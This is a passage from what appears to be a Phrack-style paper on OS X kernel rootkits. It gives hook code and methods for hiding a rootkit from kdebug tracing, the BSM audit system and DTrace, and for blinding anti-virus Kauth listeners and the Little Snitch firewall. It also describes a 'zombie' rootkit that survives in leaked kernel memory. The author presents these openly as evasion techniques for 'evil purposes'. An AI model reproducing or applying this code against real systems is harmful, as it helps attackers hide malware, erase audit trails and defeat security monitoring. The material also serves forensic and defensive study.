syscalls code. kdebug's tracing of syscalls entry and exit can be found
at unix_syscall64 using two macros that call kernel_debug():

(...)
KERNEL_DEBUG_CONSTANT_IST(KDEBUG_TRACE,
                BSDDBG_CODE(DBG_BSD_EXCP_SC, code) | DBG_FUNC_START,
                (int)(*ip), (int)(*(ip+1)), (int)(*(ip+2)),
                (int)(*(ip+3)), 0);
(...)
error = (*(callp->sy_call))((void *) p, uargp, &(uthread->uu_rval[0]));
(...)
KERNEL_DEBUG_CONSTANT_IST(KDEBUG_TRACE,
            BSDDBG_CODE(DBG_BSD_EXCP_SC, code) | DBG_FUNC_END,
            error, uthread->uu_rval[0], uthread->uu_rval[1], p->p_pid, 0);
(...)

The easiest way to disable tracing of BSD related functions (besides
patching kernel_debug to just return) is to modify the calls to
kernel_debug() and reroute them to our own function. The disassembler
makes this extremely easy, so much that I implemented code for each call
to kernel_debug() to have its own trampoline (there is really no need
for such thing!). Sample function to disable all BSD syscall traces:

void
tfc_kernel_debug(uint32_t debugid, uintptr_t arg1, uintptr_t arg2,
uintptr_t arg3, uintptr_t arg4, __unused uintptr_t arg5)
{
 // solve the symbol of the original function
 static void (*_kernel_debug)(uint32_t debugid, uintptr_t arg1,
 uintptr_t arg2, uintptr_t arg3, uintptr_t arg4,
 __unused uintptr_t arg5) = NULL;
 if (_kernel_debug == NULL)
  _kernel_debug = (void*)solve_kernel_symbol(&g_kernel_info,
  "_kernel_debug");

 // do not let fs_usage/sc_usage trace any BSD* system calls
 if ( (debugid >> 24) == DBG_BSD) return;
 else _kernel_debug(debugid, arg1, arg2, arg3, arg4, 0);
}

This patch will be suspicious when fs_usage and/or sc_usage are used
because no BSD system calls will be traced and screen output will be very
low. kdebug's implementation poses some problems to distinguish between
cases to hide or not. Its buffers are very small and this is easily
noticed if you peak at fs_usage or sc_usage code (verify the lookup()
[bsd/vfs/vfs_lookup.c] kernel function to see how fs_usage gets the path
name for syscalls such as open()).

Fortunately for us there is a easy way to accomplish this using
current_proc() - it returns a proc structure for the currently executing
process. With this information we can retrieve the process name from
the proc structure (p_comm field, max size 16) and match against the
processes we do not want traced. A code snippet for a simple check to
hide vmware-tools-daemon:

struct proc *p = current_proc();
// MAXCOMLEN == 16, we could hash always to MAXCOMLEN to avoid strlen call
uint32_t hash = hash_name(&p->p_comm[0], strlen(&p->p_comm[0]));
static uint32_t hidehash = 0;
if (hidehash == 0) hidehash = hash_name("vmware-tools-daemon", MAXCOMLEN);
if (hash == hidehash ) return;
else _kernel_debug(debugid, arg1, arg2, arg3, arg4, 0);

The basic blocks to override kdebug are presented, implementation details
are left to the attached sample code and to you.

One final word of caution. The interception of Mach syscalls at kdebug
gives some problems and the hooking is very unstable (read kernel
panics). This is particularly exacerbated with the zombies rootkit
feature later described. The attached code has been written to support
that feature but at time of writing I still had no time to research the
Mach problem - the code just ignores that class.


------[ 6.2.3 - TrustedBSD

TrustedBSD is a project that started in FreeBSD and was ported to OS
X in Leopard. It enables a series of (interesting) security features,
the most famous one being the OS X/iOS sandbox. Its implementation is
done by adding "hooks" in critical kernel functions. Policy modules
can be written to receive events from these "hooks" and act on them
if necessary/desirable.

One easy application is to create a runtime file system checker for
critical folders. The app monitors LaunchDaemons and notify the user if
a new file was added in there, which is a not so frequent operation and
a favourite spot for malware to make itself persistent (oh, this was a
good opportunity to use APT buzzword!). It can be used for evil purposes -
the same "hooks" can increase privileges or hide files [25].

Using an example with the open syscall (to be used later with in Kauth
section):

open() -> open_nocancel() -> open1()
                               |
                               v
                         vn_open_auth() -> vn_authorize_open_existing()
                                                    |
                                                    v
                                           mac_vnode_check_open()
                                                    |
                                                    v
                                                MAC_CHECK()
                                                    |
                                                    v
                                           call policy, if registered

The vnode check handler that we can install has the following prototype:

typedef int mpo_vnode_check_open_t(
        kauth_cred_t cred,
        struct vnode *vp,
        struct label *label,
        int acc_mode);

Our handler will receive a pointer to the vnode structure and make
it possible to dump the filename and even transverse the full path
(remember that vnodes exist in a linked list).

MAC_CHECK() is a macro that will route the request to the policy
modules. It is a bit like sysent table where there is a list called
mac_policy_list that holds function pointers. A presentation by Andrew
Case on Mac memory forensics [26] analyses how to find malicious
TrustedBSD modules using this list against a sample I created (rex
the wonder dog). It is worth to check his slides for other Mac memory
forensics tips.

The available policy checks can be found at bsd/security/mac_framework.h,
and their implementation is in the different source files in the same
folder. What interests us is that mac_* functions are always called so
there is a point of entry that can be used. The mac_* functions contain
all the necessary/available information since they are the ones always
calling and passing the parameters to the policy modules via MAC_CHECK()
macro.

To attack this we can use the same old story: hook those functions,
or attack the mac_policy_list using the syscall handler concept, or
something else. When loading the rootkit it might also be useful to
lookup the policy list to verify if there is anything else installed
other than default modules. The system owner might be a bit smarter than
the vast majority ;-).


------[ 6.2.4 - Auditing - Basic Security Module

The auditing features available from the Basic Security Module
Implementation are not really instrumentation but since their purpose is
to track user and process actions we should be interested in understanding
and tweak them to our evil purposes.

Auditing is not fully enabled by default due to its (potentially)
considerable performance hit and disk space usage (oh, I miss those
PCI-DSS meetings). To modify its configuration you need to edit
/etc/security/audit_control. The two interesting fields are flags and
naflags (flags for events that can be matched to a user, naflags for
those who can't). Event classes are defined in /etc/security/audit_class
(description can be found at [27] and [28]). For example, if "pc" class
is configured audit will log exec() and its arguments.

Let's move to what really matters for us, evil stuff! Auditing is
implemented with macros [bsd/security/audit/audit.h] inside BSD and
Mach system calls (and some other places). The following code snippet
is from unix_syscall64 implementation, where entry and exit macros are
placed before the syscall function to be executed is called:

AUDIT_SYSCALL_ENTER(code, p, uthread);
error = (*(callp->sy_call))((void *) p, uargp, &(uthread->uu_rval[0]));
AUDIT_SYSCALL_EXIT(code, p, uthread, error);

About the contents of entry macro:

/*
 * audit_syscall_enter() is called on entry to each system call. It is
 * responsible for deciding whether or not to audit the call
 * (preselection), and if so, allocating a per-thread audit record.
 * audit_new() will fill in basic thread/credential properties.
 */

The exit macro is the interesting one because it calls
audit_syscall_exit():

/*
 * audit_syscall_exit() is called from the return of every system call, or
 * in the event of exit1(), during the execution of exit1(). It is
 * responsible for committing the audit record, if any, along with return
 * condition.
 */

When committed, the audit record will be added to an audit queue and
removed from the user thread structure (struct uthread, field uu_ar
[bsd/sys/user.h]).

void
audit_syscall_exit(unsigned int code, int error, __unused proc_t proc,
    struct uthread *uthread) {
(...)
        audit_commit(uthread->uu_ar, error, retval);
out:
        uthread->uu_ar = NULL;
}

The commit function:

void audit_commit(struct kaudit_record *ar, int error, int retval) {
(..)
        TAILQ_INSERT_TAIL(&audit_q, ar, k_q); // add to queue
        audit_q_len++;
        audit_pre_q_len--;
        cv_signal(&audit_worker_cv); // signal worker who commits to disk
        mtx_unlock(&audit_mtx);
}

By default in OS X, almost everything is disabled excepting logging
and authentication to obtain higher privileges. The command "praudit
/dev/auditpipe" (as root, of course) can be used to live audit events. Run
the command and login via ssh, or lock and unlock the console to see
these events.

Syscall exit or audit commit functions can be temporarily patched to
test if they are the right places, and yes they are. Removing the call
to audit_commit() or patching it with a ret removes any trace of audit
events in logs. There are four references to commit in OS X 10.8.2
(3 calls, 1 jump):

- audit_syscall_exit
- audit_mach_syscall_exit
- audit_proc_coredump
- audit_session_event

To have granular control over the auditing process is a bit more
complicated. There is not always enough information available to
distinguish between the cases we want to hide at audit_commit(). For
example, if process auditing is enabled, the fork1() function calls
audit like this: AUDIT_ARG(pid, child_proc->p_pid);

This will call the function responsible to set the audit record field:

void audit_arg_pid(struct kaudit_record *ar, pid_t pid)
{
    ar->k_ar.ar_arg_pid = pid;
    ARG_SET_VALID(ar, ARG_PID);
}

The problem here is that we do not have (yet) enough information about
this fork; we are not sure (yet) if it is the process we want to hide or
some other process. A different tactic must be used! Because there is
an events queue we can hijack the worker responsible for those commits
to disk, audit_worker() [bsd/security/audit/audit_worker.c].

The missing piece is how to correlate all events we are interested
in. Luckily for us (and the auditor in particular) there is a session
id in audit record structure [bsd/security/audit/audit_private.h]:

pid_t  ar_subj_asid; /* Audit session ID */

With this information we just need to hold the queue commit to disk until
enough information to find the correct session ID is available. When we
have it we can edit the queue and remove all the entries that match that
session ID.

Last but not least, there is a critical task left! Auditing logs must be
cleaned in case auditing was already properly configured. The bad news
is that you will have to do this dirty work yourself. Do not forget that
the logs are in binary format and OpenBSM's source at [29] can be helpful
(praudit outputs XML format so it might be a good starting point).


------[ 6.2.5 - DTrace

DTrace is a fantastic dynamic tracing framework introduced by Sun in
Solaris and available in Mac OS X since Leopard. It can be used to trace
in real-time almost every corner of kernel and user processes with minimum
performance impact. An experienced system administrator can use its
power to assist in discovering strange (aka malicious) behaviour. There
are different providers that can trace almost every function entry and
exit, BSD syscalls and Mach traps, specific process, virtual memory, and
so on. The two most powerful providers against rootkits are syscall and
fbt (function boundary). We will see how they are implemented and how to
modify them to hide rootkit activity. A good design and implementation
overview is provided by [23] (Google is your friend) and usage guide at
[24].


------[ 6.2.5.1 - syscall provider

This provider allows to trace every BSD system call entry and return (the
provider for Mach traps is mach_trap). A quick example that prints the path
argument being passed to the open() syscall:
# dtrace -n 'syscall::open:entry
{
    printf("opening %s", copyinstr(arg0));
}'
dtrace: description 'syscall::open:entry' matched 1 probe
CPU     ID                    FUNCTION:NAME
  0    119                       open:entry opening /dev/dtracehelper
  0    119                       open:entry opening
/usr/share/terminfo/78/xterm-256color
  0    119                       open:entry opening /dev/tty
  0    119                       open:entry opening /etc/pf.conf

The syscall provider is useful to detect syscall handler manipulation
but not the function pointers modification at sysent table. To understand
why let's delve into its implementation.

This provider is implemented by rewriting the system call table when
a probe is enabled, which in practice is the same operation as sysent
hooking. The interesting source file is bsd/dev/dtrace/systrace.c. It
contains a global pointer called systrace_sysent - a DTrace related
structure that will hold the original system call pointer and some
other info.

Things start happening at systrace_provide(). Here systrace_sysent is
allocated and all necessary information copied from the original sysent
table (systrace_init). Then internal DTrace probe information is added.

DTrace's philosophy is of zero probe effect when disabled so there are
functions that replace and restore the sysent table entries. There is a
struct called dtrace_pops_t which contains provider's operations. Syscall
provider has the following:

static dtrace_pops_t systrace_pops = {
        systrace_provide,
        NULL,
        systrace_enable,
        systrace_disable,
        NULL,
        NULL,
        NULL,
        systrace_getarg,
        NULL,
        systrace_destroy
};

systrace_enable() will modify sysent function pointers and redirect them
to dtrace_systrace_syscall(). Code snippet responsible for this:

(...)
 lck_mtx_lock(&dtrace_systrace_lock);
 if (sysent[sysnum].sy_callc == systrace_sysent[sysnum].stsy_underlying)
 {
    vm_offset_t dss = (vm_offset_t)&dtrace_systrace_syscall;
    ml_nofault_copy((vm_offset_t)&dss,
(vm_offset_t)&sysent[sysnum].sy_callc, sizeof(vm_offset_t));
 }
 lck_mtx_unlock(&dtrace_systrace_lock);
(...)

Attaching a kernel debugger and inserting a breakpoint on
systrace_enable() confirms this (keep in mind all these values include
ASLR slide of 0x24a00000):

Before:

gdb$ print *(struct sysent*)(0xffffff8025255840+5*sizeof(struct sysent))
$12 = {
  sy_narg = 0x3,
  sy_resv = 0x0,
  sy_flags = 0x0,
  sy_call = 0xffffff8024cfc210,          <- open syscall, sysent[5]
  sy_arg_munge32 = 0xffffff8024fe34f0,
  sy_arg_munge64 = 0,
  sy_return_type = 0x1,
  sy_arg_bytes = 0xc
}

dtrace_systrace_syscall is located at address 0xFFFFFF8024FDC630.

After enabling a 'syscall::open:entry' probe:

gdb$ print *(struct sysent*)(0xffffff8025255840+5*sizeof(struct sysent))
$13 = {
  sy_narg = 0x3,
  sy_resv = 0x0,
  sy_flags = 0x0,
  sy_call = 0xffffff8024fdc630,    <- now points to dtrace_systrace_syscall
  sy_arg_munge32 = 0xffffff8024fe34f0,
  sy_arg_munge64 = 0,
  sy_return_type = 0x1,
  sy_arg_bytes = 0xc
}

To recall DTrace's flow:
  User                          Kernel
open() -|-> unix_syscall64() -> dtrace_systrace_syscall -> open() syscall

What are the conclusions from all this? If only the sysent table function
pointers are modified by the rootkit, DTrace will be unable to directly
detect the rootkit using syscall provider. The modified pointer will
be copied by DTrace and return to it. DTrace is blind to the original
function because it does not exist anymore in the table, only inside
our modified version.

If we modify the syscall handler as described in 2.6 and do not update
the sysent references in DTrace related functions then DTrace usage will
signal the potential presence of a rootkit. DTrace is still referencing
the original sysent table and will modify it but the syscall handler is
not. The result is that DTrace syscall provider will never receive any
event. Conclusion: don't forget to fix those references, although the
functions that need to be patched are all static.


------[ 6.2.5.2 - fbt provider

fbt stands for function boundary tracing and allows tracing function entry
and exit of almost all kernel related functions (there is a small list of
untraceable functions called critical_blacklist [bsd/dev/i386/fbt_x86.c]).

The possibilities to detect malicious code using this provider are higher
due to its design and implementation. An example using rubilyn rootkit
is the best way to demonstrate this:

#dtrace -s /dev/stdin -c "ls /"
fbt:::entry
/pid == $target/
{
}
^D

Searching output for getdirentries64, without rootkit:

  0  99661             unix_syscall64:entry
  0  97082  kauth_cred_uthread_update:entry
  0  91985            getdirentries64:entry
  0  92677        vfs_context_current:entry

Now with rootkit loaded:

  0  99661             unix_syscall64:entry
  0  97082  kauth_cred_uthread_update:entry
  0   2119        new_getdirentries64:entry  <- hooked syscall!!!
  0  91985            getdirentries64:entry  <- original function
  0  92677        vfs_context_current:entry

A very simple trace is able to detect both the hooked syscall and the
call to original getdirentries64. Houston, we have a rootkit problem!

DTrace's fbt design and implementation are very interesting so let me
"briefly" go thru it to find a way to hide the rootkit.

fbt's design is explained in [23]:

"On x86, FBT uses a trap-based mechanism that replaces one of the
instructions in the sequence that establishes a stack frame (or one of
the instructions in the sequence that dismantles a stack frame) with an
instruction to transfer control to the interrupt descriptor table (IDT).
The IDT handler uses the trapping instruction pointer to look up the FBT
probe and transfers control into DTrace. Upon return from DTrace, the
replaced instruction is emulated from the trap handler by manipulating
the trap stack."

The source files we should focus on are bsd/dev/i386/fbt_x86.c and
bsd/dev/dtrace/fbt.c.

DTrace's OS X implementation is done using an illegal instruction opcode,
which is (usually) patched into the instruction that sets the base pointer
(EBP/RBP). The instruction is emulated inside DTrace and not re-executed
as it happens in debuggers using int3 breakpoints.

Memory dump example with getdirentries64:

Before activating the provider:

gdb$ x/10i 0xFFFFFF8024D01C20
0xffffff8024d01c20:  55                            push   rbp
0xffffff8024d01c21:  48 89 e5                      mov    rbp,rsp
0xffffff8024d01c24:  41 56                         push   r14
0xffffff8024d01c26:  53                            push   rbx

After:

# dtrace -n fbt::getdirentries64:entry

gdb$ x/10i 0xFFFFFF8024D01C20
0xffffff8024d01c20:  55                         push   rbp
0xffffff8024d01c21:  f0 89 e5                   lock mov ebp,esp <- patched
0xffffff8024d01c24:  41 56                      push   r14
0xffffff8024d01c26:  53                         push   rbx

The function that does all the work to find the patch location is
__provide_probe_64() [bsd/dev/i386/fbt_x86.c] (FBT_PATCHVAL defines the
illegal opcode byte).

Patching is done at fbt_enable() [bsd/dev/dtrace/fbt.c]:

if (fbt->fbtp_currentval != fbt->fbtp_patchval)
{
    (void)ml_nofault_copy((vm_offset_t)&fbt->fbtp_patchval,
(vm_offset_t)fbt->fbtp_patchpoint, sizeof(fbt->fbtp_patchval));

    fbt->fbtp_currentval = fbt->fbtp_patchval;
    ctl->mod_nenabled++;
}

Dtrace is activated inside kernel_trap():
#if CONFIG_DTRACE
    if (__improbable(tempDTraceTrapHook != NULL)) {
        if (tempDTraceTrapHook(type, state, lo_spp, 0) == KERN_SUCCESS) {
            /*
             * If it succeeds, we are done...
             */
            return;
        }
    }
#endif /* CONFIG_DTRACE */

tempDTraceTrapHook is just a function pointer, which in fbt provider
case points to fbt_perfCallback [bsd/dev/i386/fbt_x86.c]. The latter
is responsible for calling the DTrace functionality and emulating the
patched instruction. The emulations depends on the type of patch that
was made - prologue (entry) or epilogue (return), and which instruction
was patched. These can be:

- MOV RSP, RBP
- POP RBP
- LEAVE
- Also NOPs used by the sdt provider (statically defined tracing)

This information is stored inside DTrace internal structures and returned
by the call to dtrace_invop():

emul = dtrace_invop(saved_state->isf.rip, (uintptr_t *)saved_state,
saved_state->rax);

It is not possible to just patch this call because the emul value
determines the type of emulation that needs to be executed after.

dtrace_invop is used by fbt and sdt providers and does nothing more than
calling function pointers contained in dtrace_invop_hdlr linked list
[bsd/dev/dtrace/dtrace_subr.c].

Continuing through the diagram...

fbt_invop is a good candidate to hijack and hide whatever we want from
DTrace. This can be done via a trampoline or modifying the function
pointer contained in dtrace_invop_hdlr list (symbol available in kernel).
From what I could test this list is initialised with the pointer to
fbt_invop() before any calls are made to fbt provider. In principle we
can modify it without waiting for initial DTrace execution.

int fbt_invop(uintptr_t addr, uintptr_t *state, uintptr_t rval)
{
    fbt_probe_t *fbt = fbt_probetab[FBT_ADDR2NDX(addr)];

    for (; fbt != NULL; fbt = fbt->fbtp_hashnext) {
        if ((uintptr_t)fbt->fbtp_patchpoint == addr) {

            if (fbt->fbtp_roffset == 0) {
                x86_saved_state64_t *regs = (x86_saved_state64_t *)state;

                CPU->cpu_dtrace_caller = *(uintptr_t
*)(((uintptr_t)(regs->isf.rsp))+sizeof(uint64_t)); // 8(%rsp)
                /* 64-bit ABI, arguments passed in registers. */
                dtrace_probe(fbt->fbtp_id, regs->rdi, regs->rsi, regs->rdx,
regs->rcx, regs->r8); // <---------- call to dtrace functionality --------
                CPU->cpu_dtrace_caller = 0;
            } else {
                dtrace_probe(fbt->fbtp_id, fbt->fbtp_roffset, rval, 0, 0,
0);
                CPU->cpu_dtrace_caller = 0;
            }
            return (fbt->fbtp_rval); <- the emul value
        }
    }
    return (0);
}

fbt_invop finds probed address information stored in fbt_probetab array
and enters DTrace probe code. The return value that is needed for the
emulation is stored inside the structure. To fiddle with DTrace we
can emulate this function or create a modified fbt_perfCallback, adding
conditions to hide our own addresses. It contains no private symbols so
this is an easy task.

Next, is a potential implementation of a hooked fbt_perfCallback function.
Please notice that all the necessary code is not implemented. It is a
mix of code and "algorithms".

kern_return_t
fbt_perfCallback_hooked(int trapno, x86_saved_state_t *tagged_regs,
                        uintptr_t *lo_spp, __unused int unused2)
{
    kern_return_t retval = KERN_FAILURE;
    x86_saved_state64_t *saved_state = saved_state64(tagged_regs);

    if (FBT_EXCEPTION_CODE == trapno && !IS_USER_TRAP(saved_state))
    {
        uintptr_t addr = saved_state->isf.rip;
        // XXX: verify if we want to hide this address
        //      remember that addr here is where illegal instruction
        //      occurred so our list must contain that info
        int addr_is_to_hide = hide_from_fbt(addr); // implement this
        if (addr_is_to_hide)
        {
            // XXX: find fbt_probetab symbol here so we can use it next

            // and now get the search starting point
            fbt_probe_t *fbt = fbt_probetab[FBT_ADDR2NDX(addr)];
            // find the structure for current addr
            for (; fbt != NULL; fbt = fbt->fbtp_hashnext)
            {
                if ((uintptr_t)fbt->fbtp_patchpoint == addr)
                {
                    // XXX: emulate all code inside fbt_perfCallback here
                    // except call to dtrace_invop()
                    // this is the code that is inside the first IF
                    // conditions in the original function a couple of
                    // symbols might need to be solved, easy!
                }
            }
            // add fail case here ? shouldn't be necessary unless a big
            // f*ckup occurs inside DTrace structures
        }
        // nothing to hide so call the original function
        else
        {
            kern_return_t ret = KERN_FAILURE;
            // XXX: don't forget we need to solve this symbol
            ret = fbt_perfCallback(trapno, tagged-regs, lo_spp, unused2);
            return ret;
        }
    }
    return retval;
}

Functions that we want to hide from DTrace will never reach its
probe system, effectively hiding them. The performance impact should
be extremely low unless there are too many functions to hide, and
hide_from_fbt() takes too long to execute.


----[ 6.3 - AV-Monster II

AV-Monster is a (old, Feb'12) PoC that exploits the Kauth interface
used by OS X anti-virus solutions [21]. Pardon me for bringing an old
subject to this paper but it perfectly illustrates an attack on Kauth,
and also because AV vendors, as far as I know, did nothing or very little
regarding this problem.

Apple recommends in [22] that anti-virus install Kauth listeners - they
can receive file events and pass them to the scan engine. The problem
is that this creates a single point of failure that we can (easily)
exploit to bypass the scan engine and remain undetectable (AV detection
effectiveness discussion is out of scope ;-)).

A very basic AV scanning workflow is:
Execute file -> Kauth generates event -> AV kext listener -> AV scan
engine

It illustrates at least two distinct possibilities to *easily* bypass
the anti-virus. One is to patch Kauth and the other to patch the kext
listener. The old PoC code just NOPs the listener callback to render
it inoperative - the scanning engine stops receiving any events. This is
too noisy! A stealth implementation should just hijack that step and hide
the files we want to, as it is done with hiding files in the filesystem.

This time let me show you how to attack Kauth's. The example will be based
on the KAUTH_FILEOP_OPEN action and open() syscall. To avoid unnecessary
browsing of XNU sources, this is the worflow up to the interesting point:

open() -> open_nocancel() -> open1()    [ bsd/vfs/vfs_syscalls.c ]
                               |
                               v

                                             listener callback

I do not want to spam you with code but allow me to reprint the fileop
function:

int
kauth_authorize_fileop(kauth_cred_t credential, kauth_action_t action,
uintptr_t arg0, uintptr_t arg1)
{
        char            *namep = NULL;
        int             name_len;
        uintptr_t       arg2 = 0;

        /* we do not have a primary handler for the fileop scope so bail
         * out if there are no listeners.
         */
        if ((kauth_scope_fileop->ks_flags & KS_F_HAS_LISTENERS) == 0) {
                return(0);
        }

        if (action == KAUTH_FILEOP_OPEN || action == KAUTH_FILEOP_CLOSE ||
action == KAUTH_FILEOP_EXEC) {
            /* get path to the given vnode as a convenience to our
             * listeners.
             */
                namep = get_pathbuff();
                name_len = MAXPATHLEN;
                if (vn_getpath((vnode_t)arg0, namep, &name_len) != 0) {
                        release_pathbuff(namep);
                        return(0);
                }
                if (action == KAUTH_FILEOP_CLOSE) {
                        arg2 = arg1;  /* close has some flags that come in
via arg1 */
                }
                arg1 = (uintptr_t)namep;
        }
        kauth_authorize_action(kauth_scope_fileop, credential, action,
arg0, arg1, arg2, 0);

        if (namep != NULL) {
                release_pathbuff(namep);
        }
        return(0);
}

The purpose of this function is to retrieve some useful data to the
listener. In this case it is the vnode reference of the file and its
full path. Apple's documentation confirms it:

KAUTH_FILEOP_OPEN  Notifies that a file system object (a file
or directory) has been opened. arg0 (of type vnode_t) is a vnode
reference. arg1 (of type (const char *)) is a pointer to the object's
full path.

It is clear now that this is a great place to hijack and hide files
we do not want the AV to scan (or some other listener - this is also a
good feature for a file monitor). We just need to verify if current file
matches our list and return 0 if positive, else call the original code
(all these functions are not static so we can easily find the symbols).

And that's it. Simple, uh? :-)


----[ 6.4 - Little Snitch

Little Snitch is a popular application firewall that can blow up the
rootkit cover if network communications are needed and its not taken
care of (nobody likes a snitch!). Socket filters is the OS X feature that
enables Little Snitch to easily intercept and control (network) sockets
without need for hooking or any other (unstable/dubious) tricks. They
can filter inbound or outbound traffic on a socket and also out-of-band
communication [17].

The installation of a socket filter is done using the sflt_register()
function, for each domain, type, and protocol socket. Little Snitch
loops to install the filter in all possible socket combinations.

extern errno_t sflt_register(const struct sflt_filter *filter,
                             int domain,
                             int type,
                             int protocol);

The interesting detail of sflt_register() is the sflt_filter structure
[bsd/sys/kpi_socketfilter.h]. It contains a series of callbacks for
different socket operations:

struct sflt_filter {
 sflt_handle                     sf_handle;
 int                             sf_flags;
 char                            *sf_name;
 sf_unregistered_func            sf_unregistered;
 sf_attach_func                  sf_attach; // handles attaches to sockets.
 sf_detach_func                  sf_detach;
 sf_notify_func                  sf_notify;
 sf_getpeername_func             sf_getpeername;
 sf_getsockname_func             sf_getsockname;
 sf_data_in_func                 sf_data_in; // handles incoming data.
 sf_data_out_func                sf_data_out;
 sf_connect_in_func              sf_connect_in; // handles inbound
 connections.
 sf_connect_out_func             sf_connect_out;
 sf_bind_func                    sf_bind; // handles binds.
 (...)
}

History repeats itself and once again the easiest way is to hook
the function pointers and do whatever we want. Little Snitch driver
(it's an I/O Kit driver and not a kernel extension) loads very early so
hooking sflt_register() and modifying the structure on the fly is not
very interesting. We need to lookup the structure in kernel memory and
modify it.

Many different socket filters can be attached to the same socket so there
must be a data structure holding this information. The interesting source
file is bsd/kern/kpi_socketfilter.c, where a tail queue is created and
referenced using a static variable sock_filter_head.

struct socket_filter {
        TAILQ_ENTRY(socket_filter)      sf_protosw_next;
        TAILQ_ENTRY(socket_filter)      sf_global_next;
        struct socket_filter_entry      *sf_entry_head;

        struct protosw                  *sf_proto;
        struct sflt_filter              sf_filter;
        u_int32_t                       sf_refcount;
};

TAILQ_HEAD(socket_filter_list, socket_filter);
static struct socket_filter_list        sock_filter_head;

There are a few functions referencing sock_filter_head and
the disassembler can be helpful to find the correct location
(sflt_attach_internal() is a good candidate). Using gdb attached to
kernel and sock_filter_head address:

gdb$ print *(struct socket_filter_list*)0xFFFFFF800EAAC9F8
$1 = {
  tqh_first = 0xffffff8014811f08,
  tqh_last = 0xffffff8014898e18
}

(sock_filter_head located at 0xFFFFFF80008AC9F8 in 10.8.2 plus KASLR of
0xe200000 in this example)

Iterating around the tail queue we find the Little Snitch socket filter:

gdb$ print *(struct socket_filter*)0xffffff801483e608
$7 = {
  sf_protosw_next = {
    tqe_next = 0x0,
    tqe_prev = 0xffffff8014811f08
  },
  sf_global_next = {
    tqe_next = 0xffffff801483e508,
    tqe_prev = 0xffffff801483e718
  },
  sf_entry_head = 0xffffff801b29a1c8,
  sf_proto = 0xffffff800ea2bca0,
  sf_filter = {
    sf_handle = 0x27e3ea,
    sf_flags = 0x5,
    sf_name = 0xffffff7f8eb1357b "at_obdev_ls",
    sf_unregistered = 0xffffff7f8eb0938f,
    sf_attach = 0xffffff7f8eb093f9,
    sf_detach = 0xffffff7f8eb09539,
    sf_notify = 0xffffff7f8eb095e8,
    sf_getpeername = 0xffffff7f8eb096a4,
    sf_getsockname = 0xffffff7f8eb09707,
    sf_data_in = 0xffffff7f8eb0974f,
    sf_data_out = 0xffffff7f8eb09bfa,
    sf_connect_in = 0xffffff7f8eb0a076,
    sf_connect_out = 0xffffff7f8eb0a295,
    sf_bind = 0xffffff7f8eb0a446,
    sf_setoption = 0xffffff7f8eb0a4ff,
    sf_getoption = 0xffffff7f8eb0a547,
    sf_listen = 0xffffff7f8eb0a58f,
    sf_ioctl = 0xffffff7f8eb0a612,
    sf_ext = {
      sf_ext_len = 0x38,
      sf_ext_accept = 0xffffff7f8eb0a65a,
      sf_ext_rsvd = {0x0, 0x0, 0x0, 0x0, 0x0}
    }
  },
  sf_refcount = 0x17
}

The sf_name field from sflt_filter structure can be used to match
the correct socket filter, otherwise we would have to find the driver
addresses and match the function pointers that belong to that address
space.

Different possibilities exist to hide our network connections
from Little Snitch and also Apple's application firewall (named
com.apple.nke.applicationfirewall). The easiest one is to patch or
hook the sf_attach callback. Documentation from the previously mentioned
include file:

/*!
 @typedef sf_attach_func

 @discussion sf_attach_func is called to notify the filter it has been
attached to a socket. The filter may allocate memory for this attachment
and use the cookie to track it. This filter is called in one of two cases:
  1) You've installed a global filter and a new socket was created.
  2) Your non-global socket filter is being attached using the SO_NKE
socket option.
 @param cookie Used to allow the socket filter to set the cookie for this
attachment.
 @param so The socket the filter is being attached to.
 @result If you return a non-zero value, your filter will not be attached
to this socket.
*/
typedef errno_t (*sf_attach_func)(void  **cookie, socket_t so);

Forcing the callback to return a non-zero value will effectively take
socket filter firewalls out of the equation. The problem here is that
the socket_t structure might not have enough information to distinguish
the cases we want to hide - it is too early in the process so there is
no address to connect to. There are two fields that contain the PID
information of the last process to interact with the socket so this can
be useful if we already know the PID to hide connection from/to.

The other callbacks contain "richer" information for our purposes,
in particular the structure sockaddr. If you want/need this type of
fine-grain control you should hook here and use that structure to
make your hide or not decision. As an exercise, to dump the target
address you can attach gdb to the kernel and use the kgmacros command
"showsockaddr" on that argument address (assuming you are breakpointing
at the callback address).

Another piece of information that can be used to control which process
is related to the current socket the is the cookie that is set on attach
callback and passed along to almost all other callbacks. The cookie is a
user-defined structure and the following is a partial reverse of Little
Snitch's definition:

struct Cookie
{
(...)
0x48: IOLock *lock;
0x74: pid_t pid; // process to whom the socket belongs to
0x78: int32_t count;
0x7C: int32_t *xxx;
0x80: int32_t protocol;
0x85: int8_t domain;
0x86: int8_t type;
(...)
}

As in Kauth, the socket filters create a single point of failure where we
can easily hook and filter our "evil" connections. The real difficulty is
to find the head of the socket filter tail queue. Having a disassembler
in the rootkit makes this a easy task, opening the door to easily bypass
application firewalls.


----[ 6.5 - Zombie rootkits

The idea here is to explore kernel memory allocations and leaks. Kernel
and kernel extensions share the same memory map, kernel_map, and there
are a few kernel functions "families" to allocate kernel memory:

- kalloc.
- kmem_alloc.
- OSMalloc.
- MALLOC/FREE.
- IOMalloc/IOFree for I/O Kit.

All functions are wrappers for kernel_memory_allocate(). For additional
information check [30], [31] Chapter 6, [13] Chapter 12.

My initial (too complicated idea) was to load the rootkit, hook whatever
was needed, unload the rootkit, and then protect the memory that was
used. This was based in the fact that unloading does not destroy the
rootkit memory so everything would work as long those blocks of memory
were not reallocated to something else. I wanted to edit with kernel
memory map and mark those pages as used.

If we have a rootkit running that is not associated with a kernel
extension we kind of have a zombie rootkit and solve a few problems such
as no need to hide from kextstat, no kernel extension structures to find,
etc. I later found out that Hoglund and Butler had a similar idea in
[32] when they describe the NonPagedPool memory trick - allocate memory
in that area, copy the rootkit, and unload the driver. New ideas are
tough to have :-).

Back to the original point...
Simple things usually work better so there is no point in starting with
the complicated method. The easiest way is to create a memory leak and
use it to store the zombie rootkit version. When the original kernel
extension is unloaded all the memory that was previously allocated using
one of the functions above (tested with kalloc and _MALLOC) will not be
free'd, creating a kernel memory leak that we can abuse and profit from.

The beloved ASCII diagram:

load rootkit -> find rootkit -> calculate rootkit -> alloc zombie
                base address          size             memory
                                                          |
                                                          v
unload original <- transfer control <- fix memory <- copy rootkit into
   rootkit            to zombie        protections     zombie memory

To unload the original rootkit is extremely easy - we do not need to
execute any additional command, just return KERN_FAILURE from the start
function and rootkit will not be loaded. The zombie rootkit already
gained control before this so there is no problem and we avoid to execute
a kextunload command. Simple :-).

The control transfer to zombie code has a small caveat that inherits
from previous paragraph - the start function must return a value so we
can't simple jump into the zombie. Two ideas come to my mind to solve
this problem; first we can hook some kernel function and there transfer
